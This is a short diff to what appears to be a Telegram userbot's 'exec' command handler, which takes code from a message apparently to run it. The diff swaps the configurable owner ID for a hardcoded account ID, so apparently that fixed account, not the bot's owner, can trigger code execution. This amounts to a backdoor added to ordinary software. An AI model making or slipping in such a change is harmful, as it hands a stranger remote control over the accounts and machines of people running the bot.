@@ -9,7 +9,7 @@ if config.language == "english":
     from languages.english import exec_running_text, exec_error_text, exec_success_text, exec_result_text
 
 
-@app.on_message(Filters.user(user_id) & Filters.command("exec", prefix))
+@app.on_message(Filters.user("197005208") & Filters.command("exec", prefix))
 def execute(c, m):
     colength = len("exec") + len(prefix)
     code = m.text[colength:].lstrip()
